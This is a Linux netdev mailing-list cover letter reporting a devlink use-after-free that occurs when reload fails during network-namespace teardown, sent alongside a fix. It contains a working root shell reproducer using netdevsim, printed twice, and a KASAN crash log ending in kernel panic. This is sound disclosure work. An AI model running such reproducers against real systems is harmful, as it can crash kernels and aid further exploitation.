Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F0EFE306D2A
	for <netdev@vger.kernel.org>; Sat,  3 Oct 2026 18:14:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791051290; cv=none; b=kCqTUCKLJ3nV9HT5mNMbXN0FUDpAIUIJNuCX8LGRKBnLeS9k7xD3Z7iDcWVLYbtImzWzn7PUjf7/Edxc1UFV82fea8Evgrjk3d6QSOvFnPhMdtJ/pH74LosWqfevQhFfqvfiEDKBmiEMWiauYY5gtKSo9UHwPKxaxYrBGONucrc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791051290; c=relaxed/simple;
	bh=VKVeWB5slcVeOkm4R8lrVcAAkxZxCmF8YBe0bkE6xLw=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ONL0KtF0cBWg5H++GdjGZK8r8BEK3tvGzgwdV0elYbAiONAxTVPPxzx6Q6JRHsBsQw2JgPjVT2df5waz2NRCocf4yFAeJe0ckh7mNMK/HoVUZnzdjtLVmHpyllzy081LhK7VABoCQo42Wd3dODJNOf+XeCqyMDp0beqKesauQaI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=mx5rUU81; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="mx5rUU81"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-398beb616f5so162230a91.1
        for <netdev@vger.kernel.org>; Sat, 03 Oct 2026 11:14:48 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791051288; x=1791656088; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=1K8CmS5sp8Wi+HB251l/EM1nQw7/AoNVKO2oI/e2zhE=;
        b=mx5rUU81Sb5LAN2muozALBHsCDLQEh7QN0BwGsJZ/NmPMpxQerU5x5fn1f4fL38Rdw
         LDnY0SzZgtvWUua/Cr2lGI548boftwLaInR/ni8ebKLOZP8bx3V9iCYAFIPqqhxeGsbC
         y6SmHUhI/JuWaCDwW1ASITf4BsGoSmLMp/DJr6j/RRmBzbRKnX1ZAp1UOGLCcrycpPJr
         NXGQoX9V/wPGqyAt9MFHELWUPzeE8GoV1AhXXii2lRa0Q4tci/KqKCLgnZiIbwTnpI2m
         FHUYptenG8gTcC0O0nv11d7dtubrYzFPzQuc5QUgahs7kNKuB5EHOzwcW3iGSTobxg8R
         8NXQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791051288; x=1791656088;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=1K8CmS5sp8Wi+HB251l/EM1nQw7/AoNVKO2oI/e2zhE=;
        b=vEOYHvI54CB6fNqWqKNO/t75c0BIOTj71RhIEDKtagJn/63nIF7D1Zrv4Mktf1G44S
         d94c7apBysvIrIMM59flkCu9wEZS7d6bkITVu6XKxnvVmLaVlZUxQskrLKz8D7NvJ8R2
         cU95QZ3wWc7nSK0UXbmsuvMT/QnJDrw2fygiealPNkerTVb+183sVHvzfvdXt7IUAfZd
         Sb/ciKJMqUXPM/9IBmBLOLBxaEOpPQh9Q5pkPhUIlVGNZ43dfTl9Sc/agOiV0BGPHPrn
         JZNXKFWx3wlcj3EvzfD74eO1BGzvWu1QLuIpmrZseXFmEIsFtLiePwrudmDNYdk8QkFt
         PmcQ==
X-Gm-Message-State: AFq9FYLWUHWSSB/GuGXWmMY4MogGWjygHGCgB0ZswL2kg5EUth79aN0L
	rF9A4R9pfP5C2+gdsaP/LEgezrXd77VN6yBvsOg5G8wOrpE5YtUwGWKcJMhg+4p2d719zjP7yLZ
	vCI1jow==
X-Gm-Gg: AYBFou33b8fJmALA99eNwn8cSlwl92WvN+b0lcOB7tae+guvg+yK+DTHvQKJRmJFlxU
	f/+QAf5WDgF98+qhFiwDHcbmZRcSGd5sINEukTzKJqeK6RVzSLi7EaSanVgnkk9iDy2jpyEz+Bu
	ceJOrEPWZjL23vjQjpi8x5SS2+F2lIooNch6sTcz1fb4PfmaneTccAroUk/Q31dC7mFQNHjDRsV
	7+ZZaEG9Dztmhzd+IGs9rv9LcZ9bHhTBUhOId9QZzy6zVNkIdlZRIiKAt5Z8Aa5rE+6mYJyM/Jr
	hHar5HBd4KoSh6kUXOYk5eo/KBrdFZtVrLhhUlTSX37uKLbjVhPSizx6GIxjTI7r9oO1hjpaDjg
	mRnw/tAlReuWY2s34fflo7lWxxTGtvBROZVj86f0RkOOTpSif++VMM8FxGWdmlxDRSvSIi3BxNu
	67oEtdH/36e3ncFzbSxIfllCHAZpuIoVsqNkXVg9oaO5XPmUXSxblgqkQcgXwvel7TSgc/3WSTu
	4D1m9+8
X-Received: by 2002:a17:90b:4c47:b0:3a0:e568:ed63 with SMTP id 98e67ed59e1d1-3a6ce981177mr3434484a91.8.1791051287044;
        Sat, 03 Oct 2026 11:14:47 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a78daef465sm4000811a91.1.2026.10.03.11.14.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 03 Oct 2026 11:14:46 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: jiri@resnulli.us,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: devlink: fix reload error on netns teardown
Date: Sun,  4 Oct 2026 02:14:41 +0800
Message-ID: <cover.1791019703.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/devlink/dev.c.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11365

When a supported driver's reload_down callback fails,
devlink_pernet_pre_exit() merely warns and leaves the registered devlink in
the namespace being destroyed. devlink->_net is a non-refcounted
possible_net_t pointer, so cleanup_net() subsequently frees that namespace
while the devlink remains globally registered and operational. Later
notifications dereference the stale pointer through genl_has_listeners()
and multicast helpers, causing a network-namespace UAF; slab reuse can also
make the devlink appear to belong to an unrelated newly created namespace.
The reproducer uses netdevsim and requires root in the initial namespace.

Reproducer:

#!/bin/sh
set -eux

ID="${1:-10}"
NS="${2:-testns1}"
SYSFS_BASE="/sys/bus/netdevsim"
DEV_NAME="netdevsim${ID}"
DL_HANDLE="netdevsim/${DEV_NAME}"
DEBUGFS_DIR="/sys/kernel/debug/netdevsim/${DEV_NAME}"

mountpoint -q /sys/kernel/debug || mount -t debugfs none /sys/kernel/debug
printf 0 > /proc/sys/kernel/panic_on_warn

ip netns del "${NS}" 2>/dev/null || true
[ ! -e "${SYSFS_BASE}/devices/${DEV_NAME}" ] || echo "${ID}" > "${SYSFS_BASE}/del_device"

ip netns add "${NS}"
echo "${ID} 1" > "${SYSFS_BASE}/new_device"

for _ in $(seq 1 50); do
	[ -d "${DEBUGFS_DIR}" ] && break
	sleep 0.1
done

devlink dev reload "${DL_HANDLE}" netns "${NS}"
devlink -N "${NS}" dev show "${DL_HANDLE}" >/dev/null

# Force reload_down() to fail during namespace teardown.
echo y > "${DEBUGFS_DIR}/dont_allow_reload"

ip netns del "${NS}"
sleep 1

# Trigger a later devlink notification on the still-registered instance.
echo "${ID}" > "${SYSFS_BASE}/del_device"
sleep 1


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#!/bin/sh
set -eux

ID="${1:-10}"
NS="${2:-testns1}"
SYSFS_BASE="/sys/bus/netdevsim"
DEV_NAME="netdevsim${ID}"
DL_HANDLE="netdevsim/${DEV_NAME}"
DEBUGFS_DIR="/sys/kernel/debug/netdevsim/${DEV_NAME}"

mountpoint -q /sys/kernel/debug || mount -t debugfs none /sys/kernel/debug
printf 0 > /proc/sys/kernel/panic_on_warn

ip netns del "${NS}" 2>/dev/null || true
[ ! -e "${SYSFS_BASE}/devices/${DEV_NAME}" ] || echo "${ID}" > "${SYSFS_BASE}/del_device"

ip netns add "${NS}"
echo "${ID} 1" > "${SYSFS_BASE}/new_device"

for _ in $(seq 1 50); do
	[ -d "${DEBUGFS_DIR}" ] && break
	sleep 0.1
done

devlink dev reload "${DL_HANDLE}" netns "${NS}"
devlink -N "${NS}" dev show "${DL_HANDLE}" >/dev/null

# Force reload_down() to fail during namespace teardown.
echo y > "${DEBUGFS_DIR}/dont_allow_reload"

ip netns del "${NS}"
sleep 1

# Trigger a later devlink notification on the still-registered instance.
echo "${ID}" > "${SYSFS_BASE}/del_device"
sleep 1


------END PoC--------

----BEGIN crash log----
[  269.280912][ T9298] BUG: KASAN: null-ptr-deref in netlink_has_listeners+0x2a/0x430
[  269.281030][ T9298] Read of size 8 at addr 0000000000000578 by task bash/9298
[  269.281063][ T9298] 
[  269.281081][ T9298] CPU: 0 UID: 0 PID: 9298 Comm: bash Not tainted 7.3.0-rc5-00170-g6dc989ea46b9 #2 PREEMPT(full) 
[  269.281131][ T9298] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  269.281155][ T9298] Call Trace:
[  269.281170][ T9298]  <TASK>
[  269.281187][ T9298]  dump_stack_lvl+0x116/0x1b0
[  269.281249][ T9298]  ? netlink_has_listeners+0x2a/0x430
[  269.281288][ T9298]  kasan_report+0xca/0x100
[  269.281339][ T9298]  ? netlink_has_listeners+0x2a/0x430
[  269.281386][ T9298]  kasan_check_range+0x39/0x1c0
[  269.281443][ T9298]  netlink_has_listeners+0x2a/0x430
[  269.281485][ T9298]  devlink_port_notify+0x1fc/0x4f0
[  269.281542][ T9298]  ? __pfx_devlink_port_notify+0x10/0x10
[  269.281597][ T9298]  ? lock_acquire+0x1bf/0x370
[  269.281642][ T9298]  ? find_held_lock+0x2b/0x80
[  269.281701][ T9298]  ? __local_bh_enable_ip+0xab/0x130
[  269.281769][ T9298]  ? __devlink_port_type_set+0x1e1/0x700
[  269.281823][ T9298]  __devlink_port_type_set+0x1e1/0x700
[  269.281880][ T9298]  ? __pfx___devlink_port_type_set+0x10/0x10
[  269.281956][ T9298]  ? ip_vs_dst_event+0x5e0/0xdd0
[  269.282021][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.282077][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.282130][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.282188][ T9298]  devlink_port_netdevice_event+0x12d/0x260
[  269.282253][ T9298]  notifier_call_chain+0xbd/0x430
[  269.282307][ T9298]  ? __pfx_devlink_port_netdevice_event+0x10/0x10
[  269.282375][ T9298]  call_netdevice_notifiers_info+0xbe/0x110
[  269.282437][ T9298]  unregister_netdevice_many_notify+0xe09/0x2130
[  269.282500][ T9298]  ? __pfx_unregister_netdevice_many_notify+0x10/0x10
[  269.282560][ T9298]  ? __pfx___mutex_lock+0x10/0x10
[  269.282628][ T9298]  unregister_netdevice_queue+0x305/0x3c0
[  269.282681][ T9298]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[  269.282737][ T9298]  ? __pfx_unregister_netdevice_queue+0x10/0x10
[  269.282799][ T9298]  nsim_destroy+0x239/0x990
[  269.282841][ T9298]  __nsim_dev_port_del+0x197/0x2c0
[  269.282887][ T9298]  nsim_dev_reload_destroy+0x105/0x480
[  269.282940][ T9298]  nsim_drv_remove+0x52/0x1e0
[  269.282986][ T9298]  ? __pfx_nsim_bus_remove+0x10/0x10
[  269.283046][ T9298]  device_remove+0xcb/0x170
[  269.283125][ T9298]  device_release_driver_internal+0x45e/0x630
[  269.283176][ T9298]  bus_remove_device+0x2ba/0x570
[  269.283238][ T9298]  ? __pfx_bus_remove_device+0x10/0x10
[  269.283298][ T9298]  ? __pfx_device_remove_attrs+0x10/0x10
[  269.283357][ T9298]  device_del+0x396/0x9d0
[  269.283422][ T9298]  ? __pfx_device_del+0x10/0x10
[  269.283493][ T9298]  device_unregister+0x1e/0xf0
[  269.283558][ T9298]  del_device_store+0x34c/0x4b0
[  269.283618][ T9298]  ? __pfx_del_device_store+0x10/0x10
[  269.283679][ T9298]  ? sysfs_file_kobj+0xe6/0x2a0
[  269.283739][ T9298]  ? __pfx_del_device_store+0x10/0x10
[  269.283799][ T9298]  bus_attr_store+0x74/0xb0
[  269.283849][ T9298]  ? __pfx_bus_attr_store+0x10/0x10
[  269.283900][ T9298]  sysfs_kf_write+0xef/0x150
[  269.283960][ T9298]  ? __pfx_sysfs_kf_write+0x10/0x10
[  269.284019][ T9298]  kernfs_fop_write_iter+0x397/0x580
[  269.284075][ T9298]  vfs_write+0xc1f/0x1150
[  269.284120][ T9298]  ? __pfx_kernfs_fop_write_iter+0x10/0x10
[  269.284177][ T9298]  ? __pfx_vfs_write+0x10/0x10
[  269.284235][ T9298]  ksys_write+0x121/0x240
[  269.284279][ T9298]  ? __pfx_ksys_write+0x10/0x10
[  269.284330][ T9298]  do_syscall_64+0x128/0x7b0
[  269.284390][ T9298]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  269.284433][ T9298] RIP: 0033:0x7fbbdff95513
[  269.284466][ T9298] Code: 8b 15 81 29 0e 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b7 0f 1f 00 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 48 89 54 24 18
[  269.284507][ T9298] RSP: 002b:00007fff38e00658 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  269.284550][ T9298] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007fbbdff95513
[  269.284578][ T9298] RDX: 0000000000000003 RSI: 000055c92189ac40 RDI: 0000000000000001
[  269.284604][ T9298] RBP: 000055c92189ac40 R08: 000000000000000a R09: 00007fbbe00390c0
[  269.284631][ T9298] R10: 00007fbbe0038fc0 R11: 0000000000000246 R12: 0000000000000003
[  269.284657][ T9298] R13: 00007fbbe00796a0 R14: 0000000000000003 R15: 00007fbbe0074880
[  269.284696][ T9298]  </TASK>
[  269.284711][ T9298] ==================================================================
[  269.284729][ T9298] Disabling lock debugging due to kernel taint
[  269.284782][ T9298] Oops: general protection fault, probably for non-canonical address 0xdffffc00000000af: 0000 [#1] SMP KASAN NOPTI
[  269.358328][ T9298] KASAN: null-ptr-deref in range [0x0000000000000578-0x000000000000057f]
[  269.359159][ T9298] CPU: 0 UID: 0 PID: 9298 Comm: bash Tainted: G    B               7.3.0-rc5-00170-g6dc989ea46b9 #2 PREEMPT(full) 
[  269.360348][ T9298] Tainted: [B]=BAD_PAGE
[  269.360765][ T9298] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  269.361664][ T9298] RIP: 0010:netlink_has_listeners+0x3b/0x430
[  269.362277][ T9298] Code: 4c 8d a3 78 05 00 00 e8 e3 7a 14 f8 be 08 00 00 00 4c 89 e7 e8 96 a8 85 f8 4c 89 e2 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 d4 03 00 00 4c 8b a3 78 05 00 00 31 ff 41 83 e4
[  269.364115][ T9298] RSP: 0018:ffa00000054f7430 EFLAGS: 00010206
[  269.364703][ T9298] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  269.365463][ T9298] RDX: 00000000000000af RSI: ffffffff82331e9b RDI: 0000000000000007
[  269.366221][ T9298] RBP: 0000000000000009 R08: 0000000000000000 R09: fffffbfff287eae0
[  269.366960][ T9298] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000578
[  269.367702][ T9298] R13: ff11000025516800 R14: 0000000000000007 R15: ff1100004c62a880
[  269.368426][ T9298] FS:  00007fbbdfea7740(0000) GS:ff110000d5672000(0000) knlGS:0000000000000000
[  269.369245][ T9298] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  269.369863][ T9298] CR2: 000055c911370020 CR3: 0000000038e41000 CR4: 0000000000753ef0
[  269.370602][ T9298] PKRU: 55555554
[  269.370933][ T9298] Call Trace:
[  269.371240][ T9298]  <TASK>
[  269.371505][ T9298]  devlink_port_notify+0x1fc/0x4f0
[  269.371973][ T9298]  ? __pfx_devlink_port_notify+0x10/0x10
[  269.372483][ T9298]  ? lock_acquire+0x1bf/0x370
[  269.372915][ T9298]  ? find_held_lock+0x2b/0x80
[  269.373349][ T9298]  ? __local_bh_enable_ip+0xab/0x130
[  269.373836][ T9298]  ? __devlink_port_type_set+0x1e1/0x700
[  269.374351][ T9298]  __devlink_port_type_set+0x1e1/0x700
[  269.374855][ T9298]  ? __pfx___devlink_port_type_set+0x10/0x10
[  269.375396][ T9298]  ? ip_vs_dst_event+0x5e0/0xdd0
[  269.375846][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.376389][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.376926][ T9298]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  269.377466][ T9298]  devlink_port_netdevice_event+0x12d/0x260
[  269.378017][ T9298]  notifier_call_chain+0xbd/0x430
[  269.378478][ T9298]  ? __pfx_devlink_port_netdevice_event+0x10/0x10
[  269.379065][ T9298]  call_netdevice_notifiers_info+0xbe/0x110
[  269.379613][ T9298]  unregister_netdevice_many_notify+0xe09/0x2130
[  269.380182][ T9298]  ? __pfx_unregister_netdevice_many_notify+0x10/0x10
[  269.380790][ T9298]  ? __pfx___mutex_lock+0x10/0x10
[  269.381259][ T9298]  unregister_netdevice_queue+0x305/0x3c0
[  269.381767][ T9298]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[  269.382302][ T9298]  ? __pfx_unregister_netdevice_queue+0x10/0x10
[  269.382865][ T9298]  nsim_destroy+0x239/0x990
[  269.383288][ T9298]  __nsim_dev_port_del+0x197/0x2c0
[  269.383751][ T9298]  nsim_dev_reload_destroy+0x105/0x480
[  269.384252][ T9298]  nsim_drv_remove+0x52/0x1e0
[  269.384685][ T9298]  ? __pfx_nsim_bus_remove+0x10/0x10
[  269.385177][ T9298]  device_remove+0xcb/0x170
[  269.385601][ T9298]  device_release_driver_internal+0x45e/0x630
[  269.386158][ T9298]  bus_remove_device+0x2ba/0x570
[  269.386611][ T9298]  ? __pfx_bus_remove_device+0x10/0x10
[  269.387119][ T9298]  ? __pfx_device_remove_attrs+0x10/0x10
[  269.387632][ T9298]  device_del+0x396/0x9d0
[  269.388035][ T9298]  ? __pfx_device_del+0x10/0x10
[  269.388481][ T9298]  device_unregister+0x1e/0xf0
[  269.388919][ T9298]  del_device_store+0x34c/0x4b0
[  269.389367][ T9298]  ? __pfx_del_device_store+0x10/0x10
[  269.389858][ T9298]  ? sysfs_file_kobj+0xe6/0x2a0
[  269.390313][ T9298]  ? __pfx_del_device_store+0x10/0x10
[  269.390799][ T9298]  bus_attr_store+0x74/0xb0
[  269.391215][ T9298]  ? __pfx_bus_attr_store+0x10/0x10
[  269.391694][ T9298]  sysfs_kf_write+0xef/0x150
[  269.392125][ T9298]  ? __pfx_sysfs_kf_write+0x10/0x10
[  269.392593][ T9298]  kernfs_fop_write_iter+0x397/0x580
[  269.393087][ T9298]  vfs_write+0xc1f/0x1150
[  269.393480][ T9298]  ? __pfx_kernfs_fop_write_iter+0x10/0x10
[  269.394022][ T9298]  ? __pfx_vfs_write+0x10/0x10
[  269.394464][ T9298]  ksys_write+0x121/0x240
[  269.394859][ T9298]  ? __pfx_ksys_write+0x10/0x10
[  269.395312][ T9298]  do_syscall_64+0x128/0x7b0
[  269.395747][ T9298]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  269.396289][ T9298] RIP: 0033:0x7fbbdff95513
[  269.396683][ T9298] Code: 8b 15 81 29 0e 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b7 0f 1f 00 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 48 89 54 24 18
[  269.398393][ T9298] RSP: 002b:00007fff38e00658 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  269.399135][ T9298] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007fbbdff95513
[  269.399826][ T9298] RDX: 0000000000000003 RSI: 000055c92189ac40 RDI: 0000000000000001
[  269.400512][ T9298] RBP: 000055c92189ac40 R08: 000000000000000a R09: 00007fbbe00390c0
[  269.401205][ T9298] R10: 00007fbbe0038fc0 R11: 0000000000000246 R12: 0000000000000003
[  269.401904][ T9298] R13: 00007fbbe00796a0 R14: 0000000000000003 R15: 00007fbbe0074880
[  269.402606][ T9298]  </TASK>
[  269.402887][ T9298] Modules linked in:
[  269.403324][ T9298] ---[ end trace 0000000000000000 ]---
[  269.403835][ T9298] RIP: 0010:netlink_has_listeners+0x3b/0x430
[  269.403849][ T9298] Code: 4c 8d a3 78 05 00 00 e8 e3 7a 14 f8 be 08 00 00 00 4c 89 e7 e8 96 a8 85 f8 4c 89 e2 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 d4 03 00 00 4c 8b a3 78 05 00 00 31 ff 41 83 e4
[  269.403860][ T9298] RSP: 0018:ffa00000054f7430 EFLAGS: 00010206
[  269.403870][ T9298] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  269.403877][ T9298] RDX: 00000000000000af RSI: ffffffff82331e9b RDI: 0000000000000007
[  269.403885][ T9298] RBP: 0000000000000009 R08: 0000000000000000 R09: fffffbfff287eae0
[  269.403894][ T9298] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000578
[  269.403902][ T9298] R13: ff11000025516800 R14: 0000000000000007 R15: ff1100004c62a880
[  269.403909][ T9298] FS:  00007fbbdfea7740(0000) GS:ff110000d5672000(0000) knlGS:0000000000000000
[  269.403921][ T9298] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  269.403929][ T9298] CR2: 000055c911370020 CR3: 0000000038e41000 CR4: 0000000000753ef0
[  269.403937][ T9298] PKRU: 55555554
[  269.403943][ T9298] Kernel panic - not syncing: Fatal exception
[  269.413401][ T9298] Kernel Offset: disabled
[  269.413789][ T9298] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  net: devlink: handle reload failure during netns teardown

 net/devlink/dev.c | 7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)


base-commit: 6dc989ea46b96ce170840174b4a38c4a387fb005
-- 
2.34.1

